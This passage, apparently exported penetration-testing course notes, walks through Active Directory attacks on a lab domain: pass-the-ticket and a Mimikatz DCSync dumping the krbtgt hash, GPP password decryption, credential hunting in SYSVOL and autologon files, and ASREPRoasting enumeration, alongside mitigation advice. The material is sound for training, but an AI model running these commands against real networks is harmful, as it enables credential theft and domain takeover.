K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6\n      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+60n\n      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP\n      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw\n      T2xd+SRCmElUHUQV0eId1lALJfE1DC/5w0++2srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe\n      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN\n      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL\n      /vpppveSHvzkfq/3ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3\n      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U\n      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k\n      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw\n      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ\n      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR\n      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ\n      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM\n[+] Ticket successfully imported!\n\n  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL\n  ServiceRealm             :  INLANEFREIGHT.LOCAL\n  UserName                 :  ACADEMY-EA-DC01$\n  UserRealm                :  INLANEFREIGHT.LOCAL\n  StartTime                :  3/30/2022 3:50:25 PM\n  EndTime                  :  3/31/2022 1:50:25 AM\n  RenewTill                :  4/6/2022 3:50:25 PM\n  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType                  :  rc4_hmac\n  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==\n  ASREP (key)              :  2A621F62C32241F38FA68826E95521DD\n```\n\nWe can then type `klist` to confirm that the ticket is in memory.\n\n#### Confirming the Ticket is in Memory\n\nBleeding Edge Vulnerabilities\n\n```powershell-session\nPS C:\\Tools> klist\n\nCurrent LogonId is 0:0x4e56b\n\nCached Tickets: (3)\n\n#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL\n        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL\n        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize\n        Start Time: 3/30/2022 15:53:09 (local)\n        End Time:   3/31/2022 1:50:25 (local)\n        Renew Time: 4/6/2022 15:50:25 (local)\n        Session Key Type: RSADSI RC4-HMAC(NT)\n        Cache Flags: 0x2 -> DELEGATION\n        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n\n#1>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL\n        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL\n        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize\n        Start Time: 3/30/2022 15:50:25 (local)\n        End Time:   3/31/2022 1:50:25 (local)\n        Renew Time: 4/6/2022 15:50:25 (local)\n        Session Key Type: RSADSI RC4-HMAC(NT)\n        Cache Flags: 0x1 -> PRIMARY\n        Kdc Called:\n\n#2>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL\n        Server: cifs/academy-ea-dc01 @ INLANEFREIGHT.LOCAL\n        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize\n        Start Time: 3/30/2022 15:53:09 (local)\n        End Time:   3/31/2022 1:50:25 (local)\n        Renew Time: 4/6/2022 15:50:25 (local)\n        Session Key Type: RSADSI RC4-HMAC(NT)\n        Cache Flags: 0\n        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n```\n\nAgain, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.\n\n#### Performing DCSync with Mimikatz\n\nBleeding Edge Vulnerabilities\n\n```powershell-session\nPS C:\\Tools> cd .\\mimikatz\\x64\\\nPS C:\\Tools\\mimikatz\\x64> .\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # lsadump::dcsync /user:inlanefreight\\krbtgt\n[DC] 'INLANEFREIGHT.LOCAL' will be the domain\n[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server\n[DC] 'inlanefreight\\krbtgt' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   :\nPassword last change : 10/27/2021 8:14:34 AM\nObject Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc\n    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc\n    lm  - 0: 4562458c201a97fa19365ce901513c21\n```\n\n---\n\n## PetitPotam Mitigations\n\nFirst off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) should be applied to any affected hosts. Below are some further hardening steps that can be taken:\n\n- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services\n- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers\n- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)\n- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use\n\nFor more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.\n\n---\n\n## Recap\n\nIn this section we covered three recent attacks:\n\n- NoPac (SamAccountName Spoofing)\n- PrintNightmare (remotely)\n- PetitPotam (MS-EFSRPC)\n\nEach of these attacks can be performed with either standard domain user access (NoPac and PrintNightmare) or without any type of authentication to the domain at all (PetitPotam), and can lead to domain compromise relatively easily. There are multiple ways to perform each attack, and we covered a few. Active Directory attacks continue to evolve, and these are surely not the last extremely high-impact attack vectors that we will see. When these types of attacks are released, we should strive to build a small lab environment to practice them in, so we are ready to use them safely and effectively in a real-world engagement should the opportunity arise. Understanding how to set up these attacks in a lab can also significantly increase our understanding of the issue and help us to better advise our clients on the impact, remediation, and detections. This was just a tiny glimpse into the world of attacking AD CS, which could be an entire module.\n\nIn the next section, we'll talk through various other issues that we see from time to time in Active Directory environments that could help us further our access or lead to additional findings for our final client report.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/27-Miscellaneous Misconfigurations",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/27-Miscellaneous Misconfigurations.md",
    "title": "27 Miscellaneous Misconfigurations",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- There are many other attacks and interesting misconfigurations that we may come across during an assessment. A broad understanding of the ins and outs of AD will help us think outside the box and ...",
    "category": "02_CPTS",
    "content": "\n---\n\nThere are many other attacks and interesting misconfigurations that we may come across during an assessment. A broad understanding of the ins and outs of AD will help us think outside the box and discover issues that others are likely to miss.\n\n---\n\n## Scenario Setup\n\nIn this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portions of this section that require interaction from a Linux host, you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`.\n\n---\n\n## Exchange Related Group Membership\n\nA default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group `Exchange Windows Permissions` is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.\n\nThe Exchange group `Organization Management` is another extremely powerful group (effectively the \"Domain Admins\" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called `Microsoft Exchange Security Groups`, which contains the group `Exchange Windows Permissions`.\n\n#### Viewing Organization Management's Permissions\n\n![Advanced Security Settings for Organization Management showing permissions for Exchange Trusted Subsystem.](https://academy.hackthebox.com/storage/modules/143/org_mgmt_perms.png)\n\nIf we can compromise an Exchange server, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.\n\n---\n\n## PrivExchange\n\nThe `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.\n\nThe Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.\n\n---\n\n## Printer Bug\n\nThe Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the `RpcOpenPrinter` method and use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method, and force the server to authenticate to any host provided by the client over SMB.\n\nThe spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.\n\nThe attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.\n\nWe can use tools such as the `Get-SpoolStatus` module from [this](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) tool (that can be found on the spawned target) or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool to check for machines vulnerable to the [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability). This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.\n\n#### Enumerating for MS-PRN Printer Bug\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> Import-Module .\\SecurityAssessment.ps1\nPS C:\\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n\nComputerName                        Status\n------------                        ------\nACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True\n```\n\n---\n\n## MS14-068\n\nThis was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.\n\nThe vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The machine [Mantis](https://app.hackthebox.com/machines/98) on the Hack The Box platform showcases this vulnerability.\n\n---\n\n## Sniffing LDAP Credentials\n\nMany applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).\n\n---\n\n## Enumerating DNS Records\n\nWe can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as `BloodHound` is similar to `SRV01934.INLANEFREIGHT.LOCAL`. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as `JENKINS.INLANEFREIGHT.LOCAL`, which we can use to better plan out our attacks.\n\nThe tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the `adidnsdump` tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).\n\nOn the first run of the tool, we can see that some records are blank, namely `?,LOGISTICS,?`.\n\n#### Using adidnsdump\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 \n\nPassword: \n\n[-] Connecting to host...\n[-] Binding to host\n[+] Bind OK\n[-] Querying zone for records\n[+] Found 27 records\n```\n\n#### Viewing the Contents of the records.csv File\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ head records.csv \n\ntype,name,value\n?,LOGISTICS,?\nAAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691\nAAAA,ForestDnsZones,dead:beef::231\nA,ForestDnsZones,10.129.202.29\nA,ForestDnsZones,172.16.5.240\nA,ForestDnsZones,172.16.5.5\nAAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691\nAAAA,DomainDnsZones,dead:beef::231\nA,DomainDnsZones,10.129.202.29\n```\n\nIf we run again with the `-r` flag the tool will attempt to resolve unknown records by performing an `A` query. Now we can see that an IP address of `172.16.5.240` showed up for LOGISTICS. While this is a small example, it is worth running this tool in larger environments. We may uncover \"hidden\" records that can lead to discovering interesting hosts.\n\n#### Using the -r Option to Resolve Unknown Records\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r\n\nPassword: \n\n[-] Connecting to host...\n[-] Binding to host\n[+] Bind OK\n[-] Querying zone for records\n[+] Found 27 records\n```\n\n#### Finding Hidden Records in the records.csv File\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ head records.csv \n\ntype,name,value\nA,LOGISTICS,172.16.5.240\nAAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691\nAAAA,ForestDnsZones,dead:beef::231\nA,ForestDnsZones,10.129.202.29\nA,ForestDnsZones,172.16.5.240\nA,ForestDnsZones,172.16.5.5\nAAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691\nAAAA,DomainDnsZones,dead:beef::231\nA,DomainDnsZones,10.129.202.29\n```\n\n---\n\n## Other Misconfigurations\n\nThere are many other misconfigurations that can be used to further your access within a domain.\n\n---\n\n### Password in Description Field\n\nSensitive information such as account passwords are sometimes found in the user account `Description` or `Notes` fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.\n\n#### Finding Passwords in the Description Field using Get-Domain User\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n\nsamaccountname description\n-------------- -----------\nadministrator  Built-in account for administering the computer/domain\nguest          Built-in account for guest access to the computer/domain\nkrbtgt         Key Distribution Center Service Account\nldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!\n```\n\n---\n\n## PASSWD_NOTREQD Field\n\nIt is possible to come across domain accounts with the [passwd_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.\n\n#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol\n\nsamaccountname                                                         useraccountcontrol\n--------------                                                         ------------------\nguest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\nmlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\nehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\n$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT\nnagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT\n```\n\n---\n\n## Credentials in SMB Shares and SYSVOL Scripts\n\nThe SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named `reset_local_admin_pass.vbs`.\n\n#### Discovering an Interesting Script\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts\n\n    Directory: \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts\n\n\nMode                LastWriteTime         Length Name                                                                 \n----                -------------         ------ ----                                                                 \n-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       \n-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    \n-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     \n-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  \n```\n\nTaking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using nxc and the `--local-auth` flag as shown in this module's `Internal Password Spraying - from Linux` section.\n\n#### Finding a Password in the Script\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> cat \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts\\reset_local_admin_pass.vbs\n\nOn Error Resume Next\nstrComputer = \".\"\n \nSet oShell = CreateObject(\"WScript.Shell\") \nsUser = \"Administrator\"\nsPwd = \"!ILFREIGHT_L0cALADmin!\"\n \nSet Arg = WScript.Arguments\nIf  Arg.Count > 0 Then\nsPwd = Arg(0) 'Pass the password as parameter to the script\nEnd if\n \n'Get the administrator name\nSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n\n<SNIP>\n```\n\n---\n\n## Group Policy Preferences (GPP) Passwords\n\nWhen a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:\n\n- Map drives (drives.xml)\n- Create local users\n- Create printer config files (printers.xml)\n- Creating and updating services (services.xml)\n- Creating scheduled tasks (scheduledtasks.xml)\n- Changing local admin passwords.\n\nThese files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.\n\nThis was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.\n\nThe XML looks like the following:\n\n#### Viewing Groups.xml\n\n![XML code showing user properties for Administrator with account not disabled and password never expires.](https://academy.hackthebox.com/storage/modules/143/GPP.png)\n\nIf you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:\n\n#### Decrypting the Password with gpp-decrypt\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n\nPassword1\n```\n\nGPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. nxc also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.\n\n#### Locating & Retrieving GPP Passwords with nxc\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb -L | grep gpp\n\n[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.\n[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.\n```\n\nIt is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose. This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain. We can hunt for this using nxc with the [gpp_autologin](https://www.infosecmatter.com/nxc-module-library/?cmem=smb-gpp_autologin) module, or using the [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.\n\n#### Using nxc's gpp_autologin Module\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 \nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']\n```\n\nIn the output above, we can see that we have retrieved the credentials for an account called `guarddesk`. This may have been set up so that shared workstations used by guards automatically log in at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely a local admin, so it would be worth finding hosts where we can log in as an admin and hunt for additional data. Sometimes we may discover credentials for a highly privileged user or credentials for a disabled account/an expired password that is no use to us.\n\nA theme that we touch on throughout this module is password re-use. Poor password hygiene is common in many organizations, so whenever we obtain credentials, we should check to see if we can use them to access other hosts (as a domain or local user), leverage any rights such as interesting ACLs, access shares, or use the password in a password spraying attack to uncover password re-use and maybe an account that grants us further access towards our goal.\n\n---\n\n## ASREPRoasting\n\nIt's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.\n\nWith pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.\n\n#### Viewing an Account with the Do not Require Kerberos Preauthentication Option\n\n![Active Directory Users and Computers showing Matthew Morgan's account properties with Kerberos encryption options.](https://academy.hackthebox.com/storage/modules/143/preauth_not_reqd_mmorgan.png)\n\nASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.\n\nThe attack itself can be performed with the [Rubeus](https://github.com/GhostPack/Rubeus) toolkit and other tools to obtain the ticket for the target account. If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.\n\nBelow is an example of the attack. PowerView can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.\n\n#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | 